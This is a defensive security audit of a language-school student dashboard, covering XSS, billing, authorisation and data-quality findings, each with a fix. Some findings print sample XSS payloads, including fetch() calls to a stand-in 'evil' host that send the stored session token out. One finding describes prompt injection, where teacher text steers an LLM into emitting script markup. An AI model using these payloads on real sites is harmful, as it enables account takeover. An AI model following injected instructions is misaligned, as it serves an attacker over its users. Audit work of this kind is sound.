# Student dashboard audit (area STU)

Scope: `student-dashboard.html` (7008 lines), with cross-checks against `api/ai.js`, `api/enroll.js`, `api/join-session.js`, `api/stripe.js`, `api/webhooks/stripe.js`, `api/create-cohort.js`, `js/view-as.js`, `js/stripe/config.js` and the Phase 1 policies in `supabase/migrations/202610141800_phase1_db_lockdown.sql`.

Note on impact for every XSS below: the dashboard keeps the Supabase session (including the refresh token) in `localStorage` under `alimun-auth` (line 2822). Script running in the page can read it and take over the account. When an admin opens the dashboard through "view as" (`js/view-as.js`), the same payload runs with the admin's JWT, and `is_admin()` gives that JWT every row in the database.

### STU-01: Teacher-written session notes rendered as HTML (stored XSS, teacher to students)
- Severity: High
- Location: student-dashboard.html:2916 (`${grammarTopic}`), 2921 (`href="${n.pdf_url}"`), 4087 (`${ev.title}` in the home schedule), 4211 and 4234 (`${ev.title}` in the calendar); data loaded at 3308-3328 and 3375-3409
- Category: xss
- Confidence: high
- Scenario: The teacher of a cohort writes `grammar_focus` or `homework` on a session note, for example `<img src=x onerror="fetch('//evil/?'+localStorage['alimun-auth'])">`. Phase 1 lets the teacher write these columns at any time (`session_notes_insert`/`session_notes_update` use `teaches_session`; the column guard only protects `pdf_url`, `published_at` and `session_id`). The teacher can also edit them after the server has published the note. Once the note is published, every enrolled student loads it. The payload runs from the home schedule on "today", from the calendar detail and "Coming up" lists, and from the Exercises "Session Notes (PDFs)" list. It steals each student's session, and also the admin's if the admin views the student through "view as".
- Fix: Pass `grammarTopic`, `ev.title`, `ev.tag`, `ev.time` and `n.due_date` through `escHtml`. Validate `pdf_url` with `new URL()`, require `https:` on the Supabase storage host, and drop it otherwise.

### STU-02: Teacher feedback and teacher notes rendered as HTML in Progress (stored XSS, teacher to student)
- Severity: High
- Location: student-dashboard.html:5275 (`"${f.feedback_text}"`), 5249 (`"${latestText}"`, which reads `textContent` of the teacher-note field set at 3347 and 3509 and puts it back into `innerHTML`)
- Category: xss
- Confidence: high
- Scenario: A teacher inserts a `student_feedback` row for one of their students; `feedback_insert` allows this through `teaches_student`. They could also put markup in `session_notes.teacher_note`. On the Progress view, `renderProgress()` writes `feedback_text` straight into `innerHTML`. When the student has no feedback rows, it instead writes the raw teacher-note text, which was stored with `textContent` and so is still unescaped. The script runs in the student's session, or in the admin's under "view as".
- Fix: `escHtml(f.feedback_text)` and `escHtml(latestText)`. Better still, build these cards with `textContent`.

### STU-03: Teacher badges rendered as HTML in the teacher profile modal (stored XSS, teacher to students)
- Severity: High
- Location: student-dashboard.html:6366-6367 (`${b}` for each `teacher.badges`)
- Category: xss
- Confidence: high
- Scenario: A teacher can update their own `teacher_profiles` row: `teacher_profiles_update` allows `user_id = auth.uid()`. `guard_teacher_profile_admin_fields` blocks only `status`, `hourly_rate`, `tier_level`, `rating` and `user_id`, so `badges` (and `location`, `bio`, `experience_years`, `sessions_delivered`) stay writable. A badge such as `<img src=x onerror=...>` is exposed through `teachers_public` and rendered unescaped whenever a student opens "Your teacher". Side note: the same gap lets teachers inflate `sessions_delivered`, `experience_years` and badges, which students see as facts (lines 3303, 3827, 6392).
- Fix: `escHtml(b)`. In SQL, add `badges`, `sessions_delivered` and `experience_years` to the admin-only columns in `guard_teacher_profile_admin_fields`.

### STU-04: Cohort `timezone` and `language` (teacher input, never validated) rendered as HTML in discovery, switch and claim views
- Severity: High
- Location: student-dashboard.html:3840 (`(${c.timezone})`), 6058 (`(${c.timezone})`), 6251 (`${lang} ${level}` from `cohorts.language`); api/create-cohort.js:84-93, 160-175 (no validation of `timezone`, `language` or `description`)
- Category: xss
- Confidence: high
- Scenario: An approved teacher POSTs to `/api/create-cohort` with `language:"French"` and `timezone:"<img src=x onerror=...>"`. The API inserts the cohort as `open`. `generate_cohort_sessions` then fails on the invalid time zone, but the API still returns 201 and the cohort stays. Every French student without a class sees the cohort in Class Discovery, because the filter only checks language, level, goal and tier. `convertCohortSchedule` catches the `RangeError` and returns null, so the card still renders and the raw `c.timezone` goes into `innerHTML`. The same happens in the "Change Class / Cohort" modal. A `language` payload renders in the waitlist claim modal.
- Fix: Client: escape `c.timezone`, `c.language`, `days` and `time` everywhere they are rendered. Server (`create-cohort`): validate `timezone` against `Intl.supportedValuesOf('timeZone')`, `language` against the supported list, `schedule_time` as `HH:MM`, and cap `description` length. Make cohort insert and session generation atomic, or delete the cohort when generation fails.

### STU-05: Student-controlled text rendered as HTML runs in the admin's session through "view as" (stored XSS, student to admin)
- Severity: High
- Location: student-dashboard.html:6406 (`"${myReview.review_text}"`), 5963 (`No class cohorts available for ${lang} ${level}`, where `lang` is the student's own `student_profiles.language`); view-as boot at 2836-2850
- Category: xss
- Confidence: high
- Scenario: A student posts a teacher review whose `review_text` is `<img src=x onerror=...>`; `reviews_insert` allows it once they have been taught by the teacher. The student can also set their own `language` to markup with a direct PostgREST update, since `language` is not guarded and has no check constraint. For the student this is only self-XSS. But `view-as.js` loads the student's profile, so `USER.id` is the student's id and line 6372 finds "their" review. When the admin opens this student in "view as" and clicks the teacher card, the payload runs with the admin JWT and gets full read and write access to every table.
- Fix: `escHtml(myReview.review_text)`, `escHtml(lang)`, `escHtml(level)`. Add a check constraint, or a guard against a list, on `student_profiles.language`.

### STU-06: Waitlist-claim URL parameter injected into an inline `onclick` (reflected XSS)
- Severity: Medium
- Location: student-dashboard.html:6576-6583 (reads `claim_cohort_id` and `waitlist_id` from the URL), 6258 (`onclick="executeClaimOffer('${cohortId}', '${waitlistId}')"`), 6223-6239 (only `waitlistId` is checked against the database)
- Category: xss
- Confidence: high
- Scenario: The modal is built when `waitlist_id` matches a waitlist row with a live offer that is readable by the viewer. `claim_cohort_id` is never validated or compared with the row's `cohort_id`. A student with a live offer sends the admin `student-dashboard.html?as=<own profile id>&waitlist_id=<own waitlist id>&claim_cohort_id=x');fetch('//evil?'+localStorage['alimun-auth']);//`. The admin is in view-as, so `USER.id` is the attacker's profile, the row matches, and clicking "Claim & Join Cohort" runs the script with the admin JWT. Against other students the attacker would need the victim's waitlist UUID.
- Fix: Validate both parameters as UUIDs, and use `waitlistRec.cohort_id` instead of the URL value. Bind the button with `addEventListener` instead of building an `onclick` string.

### STU-07: AI-generated exercise content rendered without escaping; teacher text reaches the generation prompt
- Severity: Medium
- Location: student-dashboard.html:4861 and 4884 (`'${word}'` / `'${meaning}'` in both `onclick` and the button body), 4971 (`audioText` inside a double-quoted `onclick`, with only `'` escaped), 5121 (placement `${o}`), 5020 (`${ex.type}`), 5023 (`${ex.time}`); api/ai.js:337 and 362 (`grammar_focus` and teacher `feedback` put into the prompt)
- Category: ai
- Confidence: medium
- Scenario: `/api/generate-exercises` returns model text (pairs up to 80 characters, options up to 200, `audioText` up to 300) that the dashboard puts into `innerHTML` and `onclick` strings. The prompt includes the student's teacher's `session_notes.grammar_focus` and `assignment_submissions.feedback`. The block is labelled "data, not instructions", but that does not stop prompt injection. A teacher can write instructions that make the model emit `<img onerror=...>` in a matching pair or placement option, and it runs in the student's session. Even without an attacker, ordinary French or Italian content such as `l'heure` or `c'est` in a Word Matching pair breaks the `onclick` string (SyntaxError), so the button is dead and the exercise can never be completed. A `"` in `audioText` breaks out of the attribute.
- Fix: Escape every model field with `escHtml`. Stop building `onclick` strings: render buttons with `data-idx` attributes and one delegated listener that looks up the word by index. On the server, strip `<>` from generated fields and stop putting free teacher text into the prompt, or pass it as a separate, clearly delimited user turn.

### STU-08: "Change Plan" opens a new subscription checkout without cancelling the current one (double billing)
- Severity: High
- Location: student-dashboard.html:5690-5778 (`openTierUpgradeModal` / `confirmUpgrade`); api/stripe.js:145-205 (`handleCreateCheckout` never checks for an existing active subscription); api/webhooks/stripe.js:377-404 (`handleSubscriptionCheckout` overwrites `stripe_subscription_id`)
- Category: stripe
- Confidence: high
- Scenario: A paying Focused student clicks Settings → Change Plan → Intensive (or a cheaper tier) and pays. Stripe now has two active subscriptions for the same customer. The webhook replaces `stripe_subscription_id` with the new one, so nothing in Alimun tracks the old one, and it keeps charging every month. A later `customer.subscription.updated` or `deleted` on the old subscription can be matched by `stripe_customer_id` (`findStudentBySubscription` fallback). It can then flip the student's status to cancelled and cancel their enrollment while the new subscription is still active.
- Fix: When the student already has an active `stripe_subscription_id`, send plan changes through the Stripe Customer Portal (`/api/stripe/billing-portal`, already implemented) or `stripe.subscriptions.update` with proration. In `create-checkout`, refuse `mode: 'subscription'` when an active subscription exists. In the webhook, ignore events for a subscription id that is not the profile's current one.

### STU-09: AI endpoint usable as a general LLM by any signed-in account, with no paid-tier check
- Severity: Medium
- Location: student-dashboard.html:4536-4546 and 5538-5548 (the client writes the `system` and `prompt` text); api/ai.js:251-266 (`handleGrade` forwards any prompt up to 24,000 characters), 33-34 and 499-520 (caps: 150 calls per user per day, a single platform budget of $25 per day)
- Category: ai
- Confidence: high
- Scenario: The essay grader, the AI tutor chat, exercise generation and the placement test have no subscription or tier check, either client-side or on the server. Any free signup (no payment, no email confirmation) gets 150 calls a day of a free-form prompt. Only the server's platform rules are prepended to it. A few throwaway accounts can use up the shared `AI_DAILY_BUDGET_USD`, after which `/api/ai` returns 503 for every paying student until midnight UTC.
- Fix: Require `stripe_subscription_status = 'active'` (or a small free allowance) in `api/ai.js`. Move the grading and chat prompts server-side (`action=grade-essay` and `action=tutor-chat` with structured inputs) instead of accepting raw `system` and `prompt`. Add a per-IP limit and a lower per-user cap for unpaid accounts.

### STU-10: Placeholder and simulated data shown to real students as their own results
- Severity: Medium
- Location: student-dashboard.html:2800-2805 and 5132-5133 (`defaultTestResults` shown as the student's test history); 3032-3039 (`defaultMetrics` progress series); 1902-1907 and 4099-4104 (`RECENT_ACTIVITY`); 4128-4139 (cohort rank derived from local averages, streak starting at 14); 3303-3304 (teacher "48 sessions" and "5.0" rating fallbacks); 3454-3455 (classmates' online status is `Math.random()`); 4379-4400 (simulated speech score of 85-96 % when the microphone is unavailable or denied); 6383 and 6388 (bio and "Madrid, Spain" defaults); 6788 (fake teacher auto-reply in the class chat); 6847-6878 (fake "live transcription" naming "Sofia"); 6937-6950 (two fake shared PDFs with `href="#"`); static HTML 1336-1351, 1505-1524 and 1594-1600 (14 days, 87 %, #3, Marie Dubois, "8 / 12 classmates waiting", +12 %, 86 %)
- Category: bug
- Confidence: high
- Scenario: A new student opens Tests and sees four graded tests (91, 76, 58, 83) they never took. Progress shows eight weeks of history. The home screen claims a 14-day streak and cohort rank #3. Speaking exercises award an 85-96 % "pronunciation score" without hearing anything. The class chat answers with a canned "Teacher" message, and the transcription panel invents dialogue. This breaks the house rule on invented numbers and misleads paying users about their progress.
- Fix: Remove every `default*` fallback and render empty states. Compute streak, rank and averages from `exercise_results`, `assignment_submissions` and `session_attendance`, or hide those cells. Delete the simulated speech, transcript, chat auto-reply and fake files, or label them clearly as a demo.

### STU-11: Settings save and opt-in write columns that do not exist in any migration
- Severity: Medium
- Location: student-dashboard.html:5631-5642 (`timezone`, `preferred_time_start`, `preferred_time_end`, `preferred_days`), 3898-3901 (`waitlist_opt_in`), 5760 (`currency`)
- Category: rls-mismatch
- Confidence: medium
- Scenario: `supabase/schema.sql` and every migration define `student_profiles` without these columns, and no file in `api/` or `supabase/` creates or reads them. If production matches the repo, "Save Profile" fails with PGRST204 ("column not found") and changes nothing, even the name. "Notify Me When Available" fails the same way. Even if the column exists, nothing ever sends that email. The schedule matching then always runs with the student's time zone as UTC. To confirm, check `information_schema.columns` for `student_profiles` in production.
- Fix: Add the columns in a migration (with a check on `timezone` against `pg_timezone_names`, and `preferred_days int[]`), or remove the fields. Either implement the opt-in email or remove the button.

### STU-12: Paying for a cohort from Discovery does not enrol the student, and the return is not handled
- Severity: Medium
- Location: student-dashboard.html:3947-3986 (checkout created with `cohortId` after `payment_required`); api/webhooks/stripe.js:377-404 (`metadata.cohort_id` ignored); no handling of `?checkout=success|cancelled|credit` anywhere in the dashboard
- Category: bug
- Confidence: high
- Scenario: A new student clicks "Join cohort", confirms the Stripe redirect and pays. The webhook activates the tier but never enrols them in the chosen cohort. The student returns to the same Discovery page with no confirmation and must find and click the cohort again. If the cohort filled up in the meantime, they have paid without a seat. The tier also falls back to `focused` when `data.tier` is missing (line 3959).
- Fix: In `handleSubscriptionCheckout`, when `metadata.cohort_id` is set, run the same enrolment logic as `/api/enroll` (shared helper). On the dashboard, read `?checkout=` on boot, show a message, poll the profile until `stripe_subscription_status = 'active'`, then call `/api/enroll`.

### STU-13: The 5-minute refresh replaces `EXERCISES` under rendered index-based handlers
- Severity: Low
- Location: student-dashboard.html:3016-3020 (poll calls `initData()` only), 3105 (`EXERCISES = [...hwExs, ...dbExs]`), 5070 (AI exercises spliced in), 4321-4330 and 4515-4520 (handlers use `EXERCISES[index]`)
- Category: bug
- Confidence: high
- Scenario: A student generates new exercises and starts one. After the next 5-minute poll, `EXERCISES` is rebuilt without the generated items, but the DOM still has the old indices. Clicking "Check" or "Submit Essay" then grades a different exercise. It can also throw (`ex.correctAnswer` undefined → `.toLowerCase()` TypeError), and the generated set is lost. The poll also runs `initData()` while a modal is open, rewriting member colours and online states at random.
- Fix: Give exercises stable ids and look them up by id. Keep generated exercises across refreshes. Re-render after the poll, or only refresh session and notes data in the poll.

### STU-14: Teacher assignments of type Grammar, Vocabulary or Writing render an empty panel
- Severity: Low
- Location: student-dashboard.html:4679-4787 (`isHw` branch handles only `Essay`, `Homework` and `Speaking`, then falls through to the static types and returns `''`); the DB check allows `('Homework','Essay','Speaking','Grammar','Vocabulary','Writing')` (supabase/add-availability-assignments.sql:70-71); teacher-dashboard.html:1905 sends them
- Category: bug
- Confidence: medium
- Scenario: A teacher assigns a "Writing" homework, for example from the premade list. The student expands it and sees an empty box with no text area and no submit button, so the homework can never be submitted.
- Fix: Treat every `isHw` type that is not Speaking as the text-answer form.

### STU-15: Static German matching pair contains an apostrophe that breaks its `onclick`
- Severity: Low
- Location: student-dashboard.html:2733 (`'to get on one\'s nerves'`) rendered at 4884
- Category: bug
- Confidence: high
- Scenario: A German C-level student opens this Word Matching exercise. The "to get on one's nerves" button's handler is `selectMatchWord(i,'right','to get on one's nerves')`, which is a SyntaxError. The pair can never be matched, so the exercise can never be completed. Same root cause as STU-07.
- Fix: Use index-based handlers (see STU-07).

### STU-16: Classroom file upload: `file.name` in `innerHTML` (known), fake success, and uploaded files are never listed
- Severity: Low
- Location: student-dashboard.html:6961, 6975 and 6986 (`${file.name}` unescaped; known from Phase 1), 6979-6989 (any upload error falls back to a "mock" that shows a Download link with `href="#"`), 6932-6951 (list shows only the two hardcoded files; storage is never listed); also 6798-6800 (`addChatMessage` puts `sender` and `text` into `innerHTML`, self-only)
- Category: xss
- Confidence: high
- Scenario: Known: a file named `<img src=x onerror=alert(1)>.pdf` runs script in the uploader's own page (self-XSS). Beyond that, when the upload fails (for example a file over the bucket's 10 MB limit, or an RLS denial), the student is shown a downloadable file anyway. Files that do upload are never shown to the teacher or classmates, so the feature does not work. The classroom chat is local only and never reaches anyone.
- Fix: Build the items with `textContent`. Show the real error on failure. List `shared/<session_id>/` with `storage.list` and create signed URLs for downloads. Wire the classroom chat to Daily's `sendAppMessage`, or remove it.

### STU-17: Join flow shows raw error codes and leaves the classroom open when Daily join fails
- Severity: Low
- Location: student-dashboard.html:6652-6656 (`alert(data.error)`), 6688 (`await callFrame.join(...)` without try/catch), 1525 (Live view "Join Video Class" button has no time-window gating)
- Category: bug
- Confidence: high
- Scenario: `/api/join-session` returns `{error:'too_early', message:...}` or `{error:'payment_required', message:...}`, so the student sees the alert "too_early" or "payment_required". When `callFrame.join` rejects (expired token, network), the classroom overlay stays open with an empty frame, `liveSessionActive` stays true, and the rejection is unhandled. The Live view button can be clicked at any time and always yields the too_early alert.
- Fix: Show `data.message || data.error`, wrap `join` in try/catch and call `leaveClass()` on failure, and disable the Live button outside the window the way `updateCountdowns` already does for the home button.

### STU-18: "View as" performs real writes and charged AI calls as the admin, and enrol/join act on the admin's own account
- Severity: Low
- Location: student-dashboard.html:2836-2850; writes at 4598-4606 (homework submission), 4655 (exercise_results), 5142 (level), 5631 (settings), 6111 (waitlist), 6472 (review in the student's name); API calls at 3934, 6140, 6644 and 4536
- Category: authz
- Confidence: high
- Scenario: An admin previewing a student and clicking around submits homework, sets the student's level, posts a teacher review in the student's name (`reviews_insert` passes for admins), and adds waitlist rows. The column guards are bypassed for admins, so a homework upsert can overwrite a graded submission back to pending. AI calls are logged against the admin. "Join cohort" and "Join class" call the APIs with the admin JWT and fail ("Student profile not found"), or join as "Alimun staff". This is known (§0 #18). The only on-screen warning is "Edits save to this account", which `view-as.js` hides below 900 px width.
- Fix: In view-as mode, disable mutating controls in the student dashboard (a global `READ_ONLY` flag checked before every write and API call) until a server-side read-only impersonation exists.

### STU-19: Role routing falls back to `user_metadata.role`
- Severity: Low
- Location: student-dashboard.html:2839-2843 (also 2828 for the localhost preview)
- Category: authz
- Confidence: high
- Scenario: Known from Phase 1. If an account has no `app_metadata.role`, the user-editable `user_metadata.role` decides routing. The impact is limited to which dashboard loads, because data access still goes through RLS. After the Phase 1 backfill every account has an app role, so this is hardening only. `?preview=1` is restricted to `localhost` and `127.0.0.1` and creates no privileges.
- Fix: Use `app_metadata.role` only; when it is missing, send the user to `signin.html`.

### STU-20: Missing translations for most student dashboard strings
- Severity: Low
- Location: student-dashboard.html (data-i18n keys such as `student_stat_streak`, `student_class_discovery`, `day_monday` … `student_no_matching_classes`; `xt()` keys such as `student_loading_cohorts`, `student_placement_*`, `student_submit_review`) vs js/translations.js
- Category: bug
- Confidence: high
- Scenario: A script check shows about 50 `data-i18n` keys and about 75 `xt()` keys used on this page that exist only in `en` and `it`. They are missing in `es, fr, de, pt, zh, ar, ma`, so those users see English. `student_feedback_unavailable`, `student_extra_class_unavailable` and `student_no_session_to_join` are missing in every locale (the English fallback text shows). Many strings are hardcoded English with no key (alerts, discovery card text, upgrade modal, "Pending Teacher Grading").
- Fix: Add the keys for all locales and move the hardcoded alert and modal strings to keys.

### STU-21: Dead or misleading purchase controls
- Severity: Low
- Location: student-dashboard.html:1428 and 6500-6563 ("Book 1-on-1 Class" opens a "Weekly Limit Reached" paywall), 6536 (requires `prices.oneOnOneSession`), 5693-5696 (hardcoded prices)
- Category: bug
- Confidence: medium
- Scenario: The owner has been told to delete `STRIPE_PRICE_ONEONONE_SESSION` (docs/phase-1-db-lockdown.md, owner step 5). After that, "Book 1-on-1 Class" always ends in "not available yet". The modal title claims a weekly limit was reached when no limit is checked. The upgrade modal shows fixed EUR prices that are not read from Stripe and ignore the user's currency.
- Fix: Hide the 1-on-1 button when the price is missing, drop the "limit reached" copy, and read the displayed prices from Stripe (`/api/stripe/config` could return amounts).

### STU-22: Progress teacher-note selector overwrites the first metric row on the 5-minute refresh
- Severity: Info
- Location: student-dashboard.html:3348-3349
- Category: bug
- Confidence: medium
- Scenario: `#v-progress .card div div div:last-child` matches the score and delta line of the first progress row, not a teacher-note element (the Progress view has none). On first load `renderProgress()` repaints it, but each 5-minute poll replaces the "Tests" score and delta with the teacher note text until the next re-render.
- Fix: Remove those two lines, or target a dedicated element.

## Coverage

| File | Lines read |
|---|---|
| student-dashboard.html | 1-60 (head, config fetch), 46-1182 scanned for handlers and inline scripts (CSS only, no script), 1184-1881 (all markup and inline handlers), 1882-2330 and 2330-2769 (static exercise data; scanned for markup and quote issues), 2770-7006 (all script, read line by line) |
| js/view-as.js | 1-128 (all) |
| js/stripe/config.js | 1-300 (checkout helper, price resolver) |
| api/ai.js | 1-530 (all) |
| api/enroll.js | 1-316 (all) |
| api/join-session.js | 1-215 (all) |
| api/create-cohort.js | 1-260 (all) |
| api/stripe.js | 30-300 (catalogue, create-checkout, billing-portal, config) |
| api/webhooks/stripe.js | 195-420 (subscription and checkout handling) |
| supabase/migrations/202610141800_phase1_db_lockdown.sql | 1-838 (all) |
| supabase/schema.sql 20-135, add-availability-assignments.sql (assignments, reviews, rating trigger), 2026-10-14_admin_role_hardening.sql 34-71, generate-sessions-function.sql (time zone use) | cross-checks |

Inline scripts parsed with `node --check` (lines 11-40 and 1883-7005): both OK.

## RLS assumptions

| Query location | Table / RPC | Operation | What it needs | Allowed under Phase 1? |
|---|---|---|---|---|
| 2852 | student_profiles | select own by user_id | own row | Yes (`user_id = auth.uid()`) |
| 3059 | assignments | select by cohort | enrolled in cohort | Yes (`is_enrolled_in(cohort_id)`) |
| 3066 | assignment_submissions | select own | own student_id | Yes |
| 3176 | sessions + cohorts + teacher_public + session_notes | select embed | enrolled; published notes | Yes. Notes embed returns only published notes; teacher fields null if the teacher is not approved |
| 3285 | cohorts + teacher_public | select own cohort | enrolled or open/full | Yes |
| 3308 | session_notes + sessions!inner | select | published and `attends_session` | Yes (unpublished filtered) |
| 3375 | sessions + session_notes | select | enrolled | Yes |
| 3416 | session_attendance | select own | own student_id | Yes |
| 3434 | rpc cohort_classmates | execute | EXECUTE granted, enrolled | Yes |
| 3492 | student_feedback + teacher_public | select own | own student_id | Yes |
| 3572, 3942 | cohorts + teacher_public | select open/full by language | status open/full | Yes |
| 3608, 3920 | realtime postgres_changes on cohorts | subscribe | RLS select | Yes (open/full and own cohort only) |
| 3898 | student_profiles | update `waitlist_opt_in` | own row; column must exist | Policy yes; column not in any migration (STU-11) |
| 4598 | assignment_submissions | upsert own | insert: enrolled in assignment's cohort; update: own and status pending | Yes for first submit; resubmit after grading is denied (UI hides it) |
| 4655, 5148 | exercise_results | insert own | own student_id | Yes (scores are self-reported, not trustworthy for analytics) |
| 5142 | student_profiles | update `level` | own row, level not guarded | Yes |
| 5631 | student_profiles | update name/language/level/timezone/prefs | own row; columns must exist | Policy yes; 4 columns not in any migration (STU-11) |
| 6097, 6111 | cohort_waitlist | select / insert own | own student_id | Yes (guard nulls the offer fields) |
| 6223 | cohort_waitlist + cohorts | select own by id | own row; cohort visible | Yes |
| 6329 | cohorts | select teacher_id of own cohort | enrolled | Yes |
| 6339 | teachers_public | select | grant to authenticated | Yes (approved teachers only; suspended teacher → error shown) |
| 6348 | teacher_reviews + student_profiles | select by teacher | `using (true)`; embed limited by student_profiles RLS | Yes; other reviewers' names are null ("Anonymous"), their `student_id`s are exposed |
| 6472 | teacher_reviews | insert own | own student_id and `was_taught_by` | Yes; rating trigger is SECURITY DEFINER and passes the teacher guard |
| 6968 | storage `session-notes-pdfs` | upload `shared/<session>/…` | `can_use_session_files` (attends session) | Yes; nothing ever lists or reads the files (STU-16) |
| 6996 | session_attendance | update `left_at` own | own row; guard allows only `left_at` | Yes |
| view-as.js resolve/listPeople | student_profiles / teacher_profiles | select any | `is_admin()` | Yes for admin only |
